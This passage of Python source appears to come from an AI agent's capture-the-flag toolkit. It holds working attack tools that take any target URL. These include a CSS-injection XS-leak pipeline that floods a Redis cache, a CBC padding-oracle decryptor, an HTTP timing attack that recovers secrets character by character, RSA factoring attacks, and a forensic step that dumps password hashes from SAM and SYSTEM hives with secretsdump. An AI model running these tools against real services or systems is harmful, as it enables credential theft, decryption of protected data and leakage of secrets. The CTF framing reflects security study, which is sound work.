    print("Expected locations: Windows/System32/config/{{SAM,SYSTEM,SOFTWARE,SECURITY}}")
    print("                    Users/*/NTUSER.DAT")
else:
    for hive_name, hive_path in found_hives[:3]:
        print(f"\\n=== {{hive_name}} ===")
        # Try regipy
        r2 = subprocess.run(['regipy-cli', 'registry-diff', hive_path],
                            capture_output=True, text=True, timeout=15)
        if r2.returncode == 0:
            print(r2.stdout[:500])
        else:
            # Try regdump or hivex
            r3 = subprocess.run(['hivexsh', '-w', hive_path],
                                stdin=subprocess.DEVNULL, capture_output=True,
                                text=True, timeout=10)
            if r3.stdout:
                print(r3.stdout[:300])
            else:
                print(f"  (use regripper or regipy-cli to parse {{hive_name}})")
"""
        reg_result = tool_execute_python(code, timeout=30)
        if operation == "registry":
            return reg_result

    if operation in ("all", "event_logs"):
        code2 = f"""
import subprocess
wp = {repr(wp)}
kw = {repr(keyword or 'EventID')}
r = subprocess.run(['find', wp, '-name', '*.evtx', '-type', 'f'],
                   capture_output=True, text=True, timeout=10)
evtx_files = r.stdout.strip().split('\\n')
if evtx_files and evtx_files[0]:
    for evtx in evtx_files[:3]:
        print(f"Parsing: {{evtx}}")
        r2 = subprocess.run(['python3', '-m', 'evtxtools', evtx],
                            capture_output=True, text=True, timeout=15)
        if r2.returncode == 0:
            print(r2.stdout[:500])
        else:
            r3 = subprocess.run(['evtxexport', evtx],
                                capture_output=True, text=True, timeout=15)
            if r3.stdout: print(r3.stdout[:300])
            else:
                print(f"  (install python-evtx or evtxexport to parse .evtx)")
else:
    print(f"No .evtx files found under {{wp}}")
    # Check for common important event log locations
    print("Expected: Windows/System32/winevt/Logs/")
    print("Key logs: Security.evtx (4624=logon,4625=failed,4720=new user)")
    print("          System.evtx, Application.evtx, PowerShell/Operational.evtx")
"""
        evtx_result = tool_execute_python(code2, timeout=30)
        if operation == "event_logs":
            return evtx_result

    if operation in ("all", "prefetch"):
        pf_result = _shell(f"find '{wp}' -name '*.pf' -type f 2>/dev/null | head -20 && "
                          f"python3 -m prefetchparser '{wp}/Windows/Prefetch/' 2>/dev/null | head -30 || "
                          f"echo 'Install prefetch parser: pip install libscca-python'",
                          timeout=20)
        if operation == "prefetch":
            return pf_result

    if operation in ("all", "lnk_files"):
        lnk_result = _shell(f"find '{wp}' -name '*.lnk' -type f 2>/dev/null | head -20 && "
                           f"python3 -c \"import glob,subprocess; "
                           f"[subprocess.run(['lnkinfo',f],capture_output=True,text=True) for f in glob.glob('{wp}/**/*.lnk',recursive=True)[:5]]\" "
                           f"2>/dev/null || "
                           f"find '{wp}' -name '*.lnk' 2>/dev/null | xargs file 2>/dev/null | head -20",
                           timeout=20)
        if operation == "lnk_files":
            return lnk_result

    if operation in ("all", "credentials"):
        return _shell(f"find '{wp}' -name 'SAM' -o -name 'SYSTEM' 2>/dev/null | head -5 && "
                     f"echo '--- Secretsdump (if SAM+SYSTEM available) ---' && "
                     f"samdump2 '{wp}/Windows/System32/config/SYSTEM' '{wp}/Windows/System32/config/SAM' 2>/dev/null || "
                     f"secretsdump.py -sam '{wp}/Windows/System32/config/SAM' "
                     f"  -system '{wp}/Windows/System32/config/SYSTEM' LOCAL 2>/dev/null | head -20",
                     timeout=30)

    if operation in ("all", "browser_history"):
        code3 = f"""
import subprocess, os
wp = {repr(wp)}
db_paths = []
# Chrome / Chromium
r = subprocess.run(['find', wp, '-name', 'History', '-path', '*/Chrome/*'],
                   capture_output=True, text=True, timeout=10)
db_paths.extend(r.stdout.strip().split('\\n'))
# Firefox
r2 = subprocess.run(['find', wp, '-name', 'places.sqlite'],
                    capture_output=True, text=True, timeout=10)
db_paths.extend(r2.stdout.strip().split('\\n'))
for db in db_paths[:3]:
    if db and os.path.exists(db):
        print(f"DB: {{db}}")
        r3 = subprocess.run(['sqlite3', db, 'SELECT url, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 20;'],
                            capture_output=True, text=True, timeout=10)
        print(r3.stdout[:400] or r3.stderr[:200])
if not any(os.path.exists(d) for d in db_paths if d):
    print(f"No browser history found under {{wp}}")
"""
        return tool_execute_python(code3, timeout=25)

    return reg_result + "\n\n" + evtx_result if operation == "all" else "Operations: all, registry, event_logs, prefetch, lnk_files, credentials, browser_history, shellbags, amcache"


def tool_xs_leak(target_url: str, operation: str = "css_oracle",
                 secret_endpoint: str = "/secret",
                 secret_attr: str = "secret",
                 charset: str = "0123456789abcdef",
                 secret_len: int = 32,
                 upload_endpoint: str = "/upload",
                 visit_endpoint: str = "/visit",
                 output: dict = None) -> str:
    """XS-Leak and CSS injection oracle for information leakage challenges.
    Covers picoCTF 2026 Paper-2 (CSS attribute selector + Redis LRU side-channel)
    and elements-2024 (frame-count oracle).
    Ops: css_oracle (generate CSS payload with attribute selectors for all charset combos),
    lru_setup (upload marker files + prefill garbage to approach Redis memory limit),
    lru_flood (flood Redis with garbage files to trigger LRU eviction),
    lru_probe (probe all marker IDs — 200=survived/touched, 404=evicted/untouched),
    reconstruct (beam-search + LLR scoring to recover secret from survived markers),
    frame_count (count iframes/embeds visible — oracle for CSP frame injection),
    error_oracle (probe list of URLs, classify 200 vs 4xx as oracle bit),
    full_pipeline (orchestrate the complete CSS+LRU attack end-to-end)."""

    import threading, math
    base = target_url.rstrip("/")

    def _upload(data: bytes, content_type: str = "text/css"):
        try:
            import requests as _r
            r = _r.post(f"{base}{upload_endpoint}",
                        files={"file": ("f.css", data, content_type)},
                        timeout=10, verify=False, allow_redirects=False)
            loc = r.headers.get("location", "")
            paper_id = loc.rstrip("/").split("/")[-1] if loc else ""
            return paper_id
        except Exception as ex:
            return f"err:{ex}"

    def _get(url, timeout=3):
        try:
            import requests as _r
            r = _r.get(url, timeout=timeout, verify=False)
            return r.status_code
        except: return 0

    if operation == "css_oracle":
        """Generate CSS payload that uses attribute selectors to probe every n-gram in charset."""
        n = 2  # bigrams by default; try trigrams too
        combos = []
        for a in charset:
            for b in charset:
                combos.append(a + b)
        # Build CSS with custom-property trick (each selector sets a var, trigger div reads all)
        lines = []
        var_list = []
        for combo in combos:
            var = f"--m-{combo}"
            selector = f'body[{secret_attr}*="{combo}"]'
            url_ref = f"/paper/MARKER_{combo}"  # placeholder — replace with real IDs
            lines.append(f'{selector} {{ {var}: url("{url_ref}"); }}')
            var_list.append(f"var({var}, none)")
        # Prefix selectors
        for c in charset:
            for c2 in charset:
                combo = c + c2
                var = f"--px-{combo}"
                lines.append(f'body[{secret_attr}^="{combo}"] {{ {var}: url("/paper/PREFIX_{combo}"); }}')
                var_list.append(f"var({var}, none)")
        # Trigger div
        lines.append(f'#trig {{ background-image: {", ".join(var_list[:50])}; }}')
        css = "\n".join(lines)
        log("sys", f"[xs_leak] Generated CSS with {len(combos)} bigram selectors ({len(css)} bytes)", "dim")
        return (f"Generated CSS ({len(css)} bytes, {len(combos)} selectors)\n"
                "First 10 lines:\n" + "\n".join(lines[:10]) + "\n...\n"
                "[Full CSS in memory — use upload op to deploy]")

    if operation == "lru_setup":
        """Upload marker files for all charset n-grams + prefill garbage to approach memory limit."""
        results = {"markers": {}, "css_ids": [], "launcher_id": ""}
        n_garbage = output.get("n_prefill", 800) if output else 800
        marker_size = output.get("marker_size", 512) if output else 512

        log("sys", f"[xs_leak] Uploading {len(charset)**2} markers + {n_garbage} garbage files", "dim")

        # Upload markers
        for a in charset:
            for b in charset:
                combo = a + b
                marker_data = (f"<!-- marker {combo} -->" * (marker_size // 20)).encode()
                pid = _upload(marker_data, "text/html")
                results["markers"][combo] = pid

        # Upload garbage to approach memory limit
        garbage = b"G" * 60000  # ~60KB per file
        for i in range(n_garbage):
            _upload(garbage, "text/plain")
            if i % 100 == 0:
                log("sys", f"[xs_leak] Prefill {i}/{n_garbage}", "dim")

        log("sys", f"[xs_leak] Setup complete: {len(results['markers'])} markers uploaded", "dim")
        return json.dumps(results, indent=2)

    if operation == "lru_flood":
        """Flood with garbage to trigger LRU eviction after bot visit."""
        n_flood = output.get("n_flood", 300) if output else 300
        garbage = b"F" * 60000
        log("sys", f"[xs_leak] Flooding with {n_flood} garbage files", "dim")
        for i in range(n_flood):
            _upload(garbage, "text/plain")
        return f"Flooded with {n_flood} files"

    if operation == "lru_probe":
        """Probe all marker paper IDs — 200=survived (CSS matched), 404=evicted."""
        marker_ids = output.get("markers", {}) if output else {}
        if not marker_ids:
            return "Provide output={'markers': {'ab': 'paper_id', ...}}"
        survived = {}
        from concurrent.futures import ThreadPoolExecutor
        def check(item):
            combo, pid = item
            status = _get(f"{base}/paper/{pid}", timeout=2)
            return combo, status == 200
        with ThreadPoolExecutor(max_workers=200) as ex:
            for combo, hit in ex.map(check, marker_ids.items()):
                if hit: survived[combo] = True
        log("sys", f"[xs_leak] Probe: {len(survived)}/{len(marker_ids)} survived", "dim")
        return json.dumps({"survived": list(survived.keys()), "total": len(marker_ids)})

    if operation == "reconstruct":
        """Beam-search reconstruction of secret from survived bigrams/trigrams."""
        survived_set = set(output.get("survived", [])) if output else set()
        cs = charset
        n = secret_len
        beam_width = 3000

        if not survived_set:
            return "Provide output={'survived': ['ab','cd',...], 'charset': '0123456789abcdef', 'secret_len': 32}"

        # Score each n-gram
        def score(cand):
            s = 0.0
            for i in range(len(cand) - 1):
                bg = cand[i:i+2]
                if bg in survived_set: s += 1.0
            for i in range(len(cand) - 2):
                tg = cand[i:i+3]
                if tg in survived_set: s += 2.0
            return s

        # Beam search
        beam = [(c1+c2, score(c1+c2)) for c1 in cs for c2 in cs]
        beam.sort(key=lambda x: -x[1])
        beam = beam[:beam_width]

        for step in range(n - 2):
            next_beam = []
            for cand, sc in beam:
                for c in cs:
                    new = cand + c
                    new_sc = sc
                    # add new bigram
                    bg = new[-2:]
                    if bg in survived_set: new_sc += 1.0
                    # add new trigram
                    if len(new) >= 3:
                        tg = new[-3:]
                        if tg in survived_set: new_sc += 2.0
                    next_beam.append((new, new_sc))
            next_beam.sort(key=lambda x: -x[1])
            beam = next_beam[:beam_width]
            if step % 5 == 0:
                log("sys", f"[xs_leak] Beam step {step+3}/{n}: top={beam[0][0][:10]}... score={beam[0][1]:.1f}", "dim")

        top = beam[:10]
        result_lines = [f"Top {len(top)} candidates:"]
        for i, (cand, sc) in enumerate(top):
            result_lines.append(f"  [{i+1}] {cand}  (score={sc:.1f})")
        return "\n".join(result_lines)

    if operation == "full_pipeline":
        return """Full CSS+LRU pipeline for picoCTF 2026 Paper-2 style challenges:
1. xs_leak(target, 'lru_setup')       → get marker_ids dict
2. Build CSS with css_oracle output   → upload CSS bundles
3. Build launcher HTML (meta refresh → /secret?payload=<link> tags)
4. Trigger bot: GET /visit/<launcher_id>
5. Wait 10s for CSS to eval
6. xs_leak(target, 'lru_flood')       → evict untouched markers
7. xs_leak(target, 'lru_probe', output=marker_ids) → survived set
8. xs_leak(target, 'reconstruct', output={survived:...}) → candidates
9. Submit top candidate to /flag endpoint
Note: Use concurrent_requests for parallel uploads in steps 1+3."""

    if operation == "error_oracle":
        """Probe URL list, classify by status code."""
        urls = output.get("urls", []) if output else []
        if not urls: return "Provide output={'urls': [...]}"
        hits = []
        from concurrent.futures import ThreadPoolExecutor
        def check_url(u):
            return u, _get(u, timeout=3)
        with ThreadPoolExecutor(max_workers=100) as ex:
            for url, status in ex.map(check_url, urls):
                hits.append({"url": url, "status": status})
        return json.dumps(hits[:50])

    if operation == "frame_count":
        """Count visible iframes/embeds in a page (requires browser_agent)."""
        return tool_browser_agent(
            target_url,
            """
const frames = document.querySelectorAll('iframe, embed, object, frame');
console.log('FRAME_COUNT:' + frames.length);
for(let f of frames) {
    try { console.log('FRAME_SRC:' + f.src); } catch(e) {}
}
""",
            timeout=15
        )

    return "Operations: css_oracle, lru_setup, lru_flood, lru_probe, reconstruct, full_pipeline, error_oracle, frame_count"


def tool_zkp_attack(operation: str = "detect", **params) -> str:
    """ZK proof system attacks: detect (identify system + weak points),
    null_constraint (unsatisfied constraint → forge proof), weak_fiat_shamir (replay/predict challenge),
    trusted_setup (toxic waste extraction), plonk_malleability, groth16_malleability."""

    if operation == "detect":
        circuit_code = params.get("circuit_code", "")
        return ("ZK Proof System Attack Detector:\n\n"
                "== Identifying the proof system ==\n"
                "Look for: .circom/.r1cs files (Circom/Groth16/PLONK)\n"
                "         .zkey files (trusted setup keys)\n"
                "         .sol with Verifier contract (on-chain ZK)\n"
                "         snarkjs, bellman, arkworks, gnark imports\n\n"
                "== Attack 1: Null/Under-constrained signals (most common CTF vuln) ==\n"
                "  In Circom: signal that appears only as output, never in constraint\n"
                "  Effect: prover can set it to ANY value and proof still verifies\n"
                "  Find: grep for 'signal output' / 'signal private input' with no === constraint\n"
                "  Exploit: use snarkjs to generate witness with modified signal value\n\n"
                "== Attack 2: Weak Fiat-Shamir (if challenge is predictable) ==\n"
                "  Verifier uses block.timestamp or predictable randomness as challenge\n"
                "  Exploit: precompute response for expected challenge\n\n"
                "== Attack 3: Trusted Setup (powers-of-tau leakage) ==\n"
                "  If CTF 'forgets' to destroy toxic waste (tau)\n"
                "  Given tau: forge any proof for any statement\n"
                "  Check: does the CTF give you the .ptau file + ceremony transcript?\n\n"
                "== Attack 4: Groth16 malleability ==\n"
                "  Proof (A,B,C) can be rerandomized: A'=r*A, B'=B/r, C'=C+delta\n"
                "  Use to: replay proof for different public input if verifier doesn't check\n\n"
                "== Attack 5: PLONK/SNARK proof extraction ==\n"
                "  If public inputs include secret-derived value with weak range check\n"
                "  Use knowledge extractor (2 proofs same statement, different randomness)\n\n"
                "Common Circom bugs to grep for:\n"
                "  - IsZero component used without checking output\n"
                "  - Num2Bits without range check → overflow\n"
                "  - LessThan/GreaterThan with n > 252 bits → overflow\n"
                "  - Unused output signals")

    if operation == "null_constraint":
        circuit = params.get("circuit_code", "")
        code = f"""
import re
circuit = {repr(circuit)}
if not circuit:
    print("Provide circuit_code (Circom source)")
    print()
    print("Manual check for under-constrained signals:")
    print("1. List all signal declarations: grep 'signal'")
    print("2. List all constraints: grep '==='")
    print("3. Any signal not in any === constraint is under-constrained")
    print()
    print("Exploit template (snarkjs):")
    print('''
// After finding under-constrained output signal 'result':
const witness = await snarkjs.wtns.calculate(
    {{ ...normalInputs, result: BigInt("FORGED_VALUE") }},
    "circuit.wasm", {{ type: "mem" }}
);
const {{ proof, publicSignals }} = await snarkjs.groth16.prove("circuit.zkey", witness);
console.log(await snarkjs.groth16.verify(vKey, publicSignals, proof));  // true!
    ''')
else:
    signals = re.findall(r'signal\\s+(?:input|output|private)?\\s*(\\w+)', circuit)
    constraints = re.findall(r'(\\w+)\\s*===', circuit)
    constrained = set(constraints)
    for sig in signals:
        if sig not in constrained:
            print(f"[UNDER-CONSTRAINED] {{sig}} — never appears in === constraint!")
    print(f"\\nTotal signals: {{len(signals)}}, Constrained: {{len(constrained)}}")
    # Check IsZero usage
    if 'IsZero' in circuit and 'IsZero().out ===' not in circuit:
        print("[!] IsZero used but output may not be constrained")
"""
        return tool_execute_python(code, timeout=15)

    if operation == "weak_fiat_shamir":
        return f"[weak_fiat_shamir] Claude handles this directly — use execute_python/execute_shell to run the technique"

    if operation == "groth16_malleability":
        return f"[groth16_malleability] Claude handles this directly — use execute_python/execute_shell to run the technique"

    return "Operations: detect, null_constraint, weak_fiat_shamir, groth16_malleability"



# ═══════════════════════════════════════════════════════════════════════════
# 23 NEW TOOLS — wrappers around existing CLI tools and Python libraries
# ═══════════════════════════════════════════════════════════════════════════

# ──────────────────────────────────────────────────────────────────────────────
# 23 NEW TOOLS — wrappers around existing CLI tools and Python libraries
# No payload logic — delegates to: RsaCtfTool, one_gadget, jwt_tool, tplmap,
# stegseek, FLOSS, angr, blackboxprotobuf, tshark, tcpflow, peepdf,
# padbuster, basecrack, pwndbg, fuxploider, NoSQLMap, pwninit
# ──────────────────────────────────────────────────────────────────────────────

def tool_rsa_toolkit(operation: str = "auto", n: str = "", e: str = "65537",
                     c: str = "", p: str = "", q: str = "",
                     factors: list = None, moduli: list = None,
                     output_file: str = "") -> str:
    """RSA attack toolkit wrapping RsaCtfTool (github.com/RsaCtfTool/RsaCtfTool).
    Ops: auto (try all attacks), fermat (p≈q factoring), wiener (small d),
    hastads (small e broadcast), common_modulus, batch_gcd (factor N from list of moduli),
    multiprime (3+ prime factors), twin_prime, factor_only (return p,q without decrypt).
    Falls back to sympy/gmpy2 pure-Python for fermat+batch_gcd when RsaCtfTool missing."""

    def _rsactftool(args):
        # Try installed command first, then common paths
        for cmd in ["RsaCtfTool", "rsactftool", "python3 /opt/RsaCtfTool/RsaCtfTool.py",
                    "python3 ~/RsaCtfTool/RsaCtfTool.py"]:
            result = _shell(f"{cmd} {args} 2>&1", timeout=60)
            if "not found" not in result and "No such" not in result:
                return result
        return None

    # Pure-Python fallbacks using sympy/gmpy2
    def _fermat_py(n_int):
        code = f"""
import math, sympy
n = {n_int}
a = math.isqrt(n) + 1
b2 = a*a - n
while True:
    b = math.isqrt(b2)
    if b*b == b2:
        p, q = a-b, a+b
        if p*q == n:
            print(f'p = {{p}}')
            print(f'q = {{q}}')
            break
    a += 1
    b2 = a*a - n
    if a - math.isqrt(n) > 10**6:
        print('Fermat failed after 10^6 iterations — p and q not close')
        break
"""
        return tool_execute_python(code, timeout=30)

    def _batch_gcd_py(moduli_list):
        code = f"""
from math import gcd
moduli = {moduli_list}
print(f'Checking {{len(moduli)}} moduli for shared factors...')
for i in range(len(moduli)):
    for j in range(i+1, len(moduli)):
        g = gcd(moduli[i], moduli[j])
        if g > 1 and g != moduli[i]:
            print(f'[!] GCD(N[{{i}}], N[{{j}}]) = {{g}}')
            print(f'    p = {{g}}')
            print(f'    q_i = {{moduli[i]//g}}')
            print(f'    q_j = {{moduli[j]//g}}')
"""
        return tool_execute_python(code, timeout=30)

    if not n and operation not in ("batch_gcd",):
        return "Provide n= (and e=, c= for decryption)"

    n_int = int(n, 0) if n and n.startswith("0x") else int(n) if n else 0

    if operation == "fermat":
        r = _rsactftool(f"-n {n} -e {e} --attack fermat --decrypt {c}" if c else
                        f"-n {n} --attack fermat")
        return r if r else _fermat_py(n_int)

    if operation == "batch_gcd":
        ml = moduli or []
        if not ml: return "Provide moduli=[n1,n2,...] list"
        r = _rsactftool(f"--attack batch_gcd " + " ".join(f"-n {m}" for m in ml))
        return r if r else _batch_gcd_py([int(m,0) if str(m).startswith("0x") else int(m) for m in ml])

    if operation == "wiener":
        r = _rsactftool(f"-n {n} -e {e} --attack wiener" + (f" --decrypt {c}" if c else ""))
        return r if r else _shell(f"python3 -c \"from sympy.ntheory.factor_ import factorint; print(factorint({n}))\"", timeout=30)

    if operation == "hastads":
        return _rsactftool(f"-n {n} -e {e} --attack hastads" + (f" --decrypt {c}" if c else "")) or \
               "RsaCtfTool not found. Install: pip install rsactftool"

    if operation == "common_modulus":
        return _rsactftool(f"-n {n} -e {e} --attack common_modulus") or \
               "RsaCtfTool not found. Install: pip install rsactftool"

    if operation == "multiprime":
        fs = factors or []
        if fs:
            code = f"""
from Crypto.Util.number import inverse
n,e,c = {n_int},{int(e)},{int(c,0) if c and c.startswith('0x') else int(c) if c else 0}
factors = {[int(f,0) if str(f).startswith('0x') else int(f) for f in fs]}
phi = 1
for f in factors: phi *= (f-1)
d = inverse(e, phi)
m = pow(c, d, n)
import binascii
try: print('Plaintext:', binascii.unhexlify(hex(m)[2:].zfill(len(hex(m)[2:]) + len(hex(m)[2:])%2)).decode(errors='replace'))
except: print('m =', m)
"""
            return tool_execute_python(code, timeout=10)
        return _rsactftool(f"-n {n} -e {e} --attack factordb,smallfactor" + (f" --decrypt {c}" if c else "")) or \
               "Provide factors= list or install RsaCtfTool for auto-factoring"

    if operation == "factor_only":
        r = _rsactftool(f"-n {n} --attack fermat,factordb,smallfactor,wiener")
        return r if r else _fermat_py(n_int)

    # auto — try all attacks
    r = _rsactftool(f"-n {n} -e {e}" + (f" --decrypt {c}" if c else "") + " --attack all")
    return r if r else (f"RsaCtfTool not installed.\nInstall: pip install rsactftool\nFermat fallback:\n" + _fermat_py(n_int))


def tool_cbc_oracle(operation: str = "decrypt", target_url: str = "",
                    ciphertext_hex: str = "", block_size: int = 16,
                    oracle_param: str = "cipher", method: str = "POST",
                    encoding: str = "hex", headers: dict = None,
                    cookies: dict = None, known_plaintext: str = "") -> str:
    """CBC padding oracle attack wrapping padbuster / paddingoracle.
    Ops: decrypt (recover plaintext byte-by-byte via padding oracle),
    encrypt (encrypt arbitrary plaintext via oracle — block-by-block),
    probe (verify oracle is working — check padding error vs success response),
    padbuster (shell to padbuster CLI for full automation)."""

    sp = target_url
    ct = ciphertext_hex.replace(" ", "").replace(":", "")

    if operation == "padbuster":
        if not target_url or not ct:
            return "Provide target_url= and ciphertext_hex="
        enc_map = {"hex": "0", "base64": "1", "base64url": "2", "netescaped": "3"}
        enc = enc_map.get(encoding, "0")
        cmd = f"padbuster '{target_url}' '{ct}' {block_size} -encoding {enc}"
        if method == "POST": cmd += f" -post '{oracle_param}=CIPHERTEXT'"
        result = _shell(cmd, timeout=300)
        if "command not found" in result or "not found" in result:
            return "padbuster not installed. Install: apt install padbuster\nAlternative: pip install paddingoracle"
        return result

    if operation == "probe":
        code = f"""
import requests, binascii
url = {repr(target_url)}
ct = bytes.fromhex({repr(ct)})
hdrs = {repr(headers or {{}})}
cks = {repr(cookies or {{}})}
# Try with valid ciphertext vs corrupted last byte
def oracle(cipher_bytes):
    if {repr(method)} == 'POST':
        r = requests.post(url, data={{'{oracle_param}': cipher_bytes.hex()}}, headers=hdrs, cookies=cks, timeout=5, verify=False)
    else:
        r = requests.get(url, params={{'{oracle_param}': cipher_bytes.hex()}}, headers=hdrs, cookies=cks, timeout=5, verify=False)
    return r.status_code, len(r.text), r.text[:100]

valid_status, valid_len, _ = oracle(ct)
# Corrupt last byte
corrupt = bytearray(ct)
corrupt[-1] ^= 0xFF
bad_status, bad_len, bad_text = oracle(bytes(corrupt))
print(f'Valid:   status={{valid_status}} len={{valid_len}}')
print(f'Corrupt: status={{bad_status}} len={{bad_len}} preview={{bad_text[:60]}}')
if valid_status != bad_status or valid_len != bad_len:
    print('[+] Oracle CONFIRMED — distinguishable response')
else:
    print('[-] Cannot distinguish — oracle may not work or check response body')
"""
        return tool_execute_python(code, timeout=20)

    if operation in ("decrypt", "encrypt"):
        code = f"""
import requests, binascii
url = {repr(target_url)}
ct_hex = {repr(ct)}
block_size = {block_size}
method = {repr(method)}
param = {repr(oracle_param)}
hdrs = {repr(headers or {{}})}
cks = {repr(cookies or {{}})}

try:
    from paddingoracle import BadPaddingException, PaddingOracle
    class MyOracle(PaddingOracle):
        def oracle(self, data, **kwargs):
            if method == 'POST':
                r = requests.post(url, data={{param: data.hex()}}, headers=hdrs, cookies=cks, timeout=8, verify=False)
            else:
                r = requests.get(url, params={{param: data.hex()}}, headers=hdrs, cookies=cks, timeout=8, verify=False)
            if r.status_code == 500 or 'padding' in r.text.lower() or 'invalid' in r.text.lower():
                raise BadPaddingException
    
    padbuster = MyOracle()
    ct_bytes = bytes.fromhex(ct_hex)
    if '{operation}' == 'decrypt':
        plaintext = padbuster.decrypt(ct_bytes, block_size=block_size)
        print(f'Decrypted: {{repr(plaintext)}}')
        try: print(f'ASCII: {{plaintext.decode()}}')
        except: pass
    else:
        pt = {repr(known_plaintext)}.encode()
        encrypted = padbuster.encrypt(pt, block_size=block_size)
        print(f'Encrypted: {{encrypted.hex()}}')
except ImportError:
    print('paddingoracle not installed. Install: pip install paddingoracle')
    print('Alternative: use padbuster CLI with operation=padbuster')
except Exception as ex:
    print(f'Error: {{ex}}')
"""
        return tool_execute_python(code, timeout=300)

    return "Operations: decrypt, encrypt, probe, padbuster"


def tool_vigenere_crack(ciphertext: str, operation: str = "crack",
                        key_length: int = 0, known_key: str = "") -> str:
    """Automated Vigenere cipher cracking using Kasiski test + Index of Coincidence.
    Ops: crack (auto find key length + recover key + decrypt),
    kasiski (find repeated trigrams to estimate key length),
    ic_key_length (Index of Coincidence analysis for key length),
    recover_key (given key length, recover key by per-column frequency analysis)."""

    ct = re.sub(r'[^a-zA-Z]', '', ciphertext).upper()

    if operation == "kasiski":
        code = f"""
import re
from collections import Counter
ct = {repr(ct)}
# Find repeated trigrams and their distances
spacings = []
for i in range(len(ct)-2):
    trig = ct[i:i+3]
    for j in range(i+3, len(ct)-2):
        if ct[j:j+3] == trig:
            spacings.append(j-i)
if not spacings:
    print('No repeated trigrams found')
else:
    from math import gcd
    from functools import reduce
    factors = Counter()
    for s in spacings:
        for k in range(2, min(s+1, 20)):
            if s % k == 0: factors[k] += 1
    print('Likely key lengths (Kasiski):')
    for kl, cnt in sorted(factors.items(), key=lambda x:-x[1])[:8]:
        print(f'  length {{kl}}: {{cnt}} spacing matches')
"""
        return tool_execute_python(code, timeout=10)

    if operation == "ic_key_length":
        code = f"""
ct = {repr(ct)}
def ic(text):
    from collections import Counter
    n = len(text)
    if n < 2: return 0
    c = Counter(text)
    return sum(v*(v-1) for v in c.values()) / (n*(n-1))
print('Index of Coincidence by key length:')
for kl in range(1, 20):
    cols = [''.join(ct[i::kl]) for i in range(kl)]
    avg_ic = sum(ic(col) for col in cols) / kl
    flag = ' <-- likely' if avg_ic > 0.060 else ''
    print(f'  kl={{kl:2d}}  IC={{avg_ic:.4f}}{flag}')
print('(English IC ≈ 0.065, random ≈ 0.038)')
"""
        return tool_execute_python(code, timeout=10)

    if operation in ("recover_key", "crack"):
        code = f"""
from collections import Counter
import itertools
ct = {repr(ct)}
kl = {key_length} if {key_length} else None

def ic(text):
    n = len(text)
    if n < 2: return 0
    c = Counter(text)
    return sum(v*(v-1) for v in c.values()) / (n*(n-1))

# Find key length if not given
if not kl:
    best_kl, best_ic = 1, 0
    for k in range(1, 20):
        cols = [''.join(ct[i::k]) for i in range(k)]
        avg_ic = sum(ic(col) for col in cols) / k
        if avg_ic > best_ic:
            best_ic, best_kl = avg_ic, k
    kl = best_kl
    print(f'Best key length: {{kl}} (IC={{best_ic:.4f}})')

# English letter frequencies
EN_FREQ = [0.0817,0.0149,0.0278,0.0425,0.1270,0.0222,0.0202,0.0609,0.0697,
           0.0015,0.0077,0.0402,0.0241,0.0675,0.0751,0.0193,0.0010,0.0599,
           0.0633,0.0906,0.0276,0.0098,0.0236,0.0015,0.0197,0.0007]

key = []
for i in range(kl):
    col = ct[i::kl]
    best_shift, best_score = 0, -999
    for shift in range(26):
        dec = ''.join(chr((ord(c)-65-shift)%26+65) for c in col)
        freq = [dec.count(chr(65+j))/len(dec) for j in range(26)]
        score = sum(freq[j]*EN_FREQ[j] for j in range(26))
        if score > best_score:
            best_score, best_shift = score, shift
    key.append(chr(best_shift+65))

key_str = ''.join(key)
print(f'Key: {{key_str}}')
# Decrypt
plaintext = ''.join(chr((ord(c)-65-ord(k)-65)%26+65) for c,k in zip(ct, itertools.cycle(key_str)))
print(f'Decrypted: {{plaintext[:200]}}')
"""
        return tool_execute_python(code, timeout=15)

    return "Operations: crack, kasiski, ic_key_length, recover_key"


def tool_side_channel(operation: str = "timing_attack", target_url: str = "",
                      param: str = "password", charset: str = "0123456789abcdefghijklmnopqrstuvwxyz",
                      known_prefix: str = "", secret_len: int = 32,
                      method: str = "POST", samples: int = 5,
                      headers: dict = None, cookies: dict = None,
                      measurements: list = None) -> str:
    """Statistical timing and side-channel attack helper.
    Ops: timing_attack (measure response times per char to find secret byte-by-byte),
    analyze_timings (given list of (char, time) pairs, identify outlier),
    bit_leak_extract (binary search timing oracle — finds secret bit-by-bit)."""

    if operation == "timing_attack":
        if not target_url: return "Provide target_url="
        code = f"""
import requests, time, statistics, urllib3
urllib3.disable_warnings()
url = {repr(target_url)}
param = {repr(param)}
method = {repr(method)}
charset = {repr(charset)}
prefix = {repr(known_prefix)}
hdrs = {repr(headers or {{}})}
cks = {repr(cookies or {{}})}
samples = {samples}
secret_len = {secret_len}

def measure(guess):
    times = []
    for _ in range(samples):
        t0 = time.perf_counter()
        try:
            if method == 'POST':
                requests.post(url, data={{param: guess}}, headers=hdrs, cookies=cks, timeout=5, verify=False)
            else:
                requests.get(url, params={{param: guess}}, headers=hdrs, cookies=cks, timeout=5, verify=False)
        except: pass
        times.append(time.perf_counter()-t0)
    return statistics.median(times)

found = prefix
for pos in range(len(prefix), secret_len):
    best_char, best_time = None, 0
    times = {{}}
    for c in charset:
        guess = found + c
        t = measure(guess)
        times[c] = t
        if t > best_time:
            best_time, best_char = t, c
    # Check if the winner is statistically significant
    all_times = list(times.values())
    mean_t = statistics.mean(all_times)
    std_t = statistics.stdev(all_times) if len(all_times) > 1 else 0
    z_score = (best_time - mean_t) / (std_t + 1e-9)
    if z_score > 2.0:
        found += best_char
        print(f'[+] pos={{pos}}: {{best_char!r}} (t={{best_time*1000:.1f}}ms, z={{z_score:.1f}})')
    else:
        print(f'[?] pos={{pos}}: ambiguous (best={{best_char!r}} t={{best_time*1000:.1f}}ms z={{z_score:.1f}}) — may need more samples')
        found += best_char  # take best guess anyway

print(f'\\nRecovered: {{found}}')
"""
        return tool_execute_python(code, timeout=600)

    if operation == "analyze_timings":
        if not measurements: return "Provide measurements=[(char, time_seconds), ...]"
        code = f"""
import statistics
data = {measurements}
if not data: exit()
chars, times = zip(*data)
mean_t = statistics.mean(times)
std_t = statistics.stdev(times) if len(times)>1 else 0
print('Timing analysis:')
ranked = sorted(zip(chars, times), key=lambda x: -x[1])
for c, t in ranked[:10]:
    z = (t - mean_t) / (std_t + 1e-9)
    flag = ' <-- OUTLIER (likely correct char)' if z > 2 else ''
    print(f'  {{repr(c)}}: {{t*1000:.2f}}ms  (z={{z:.2f}}){flag}')
print(f'\\nmean={{mean_t*1000:.2f}}ms  std={{std_t*1000:.2f}}ms')
"""
        return tool_execute_python(code, timeout=10)

    if operation == "bit_leak_extract":
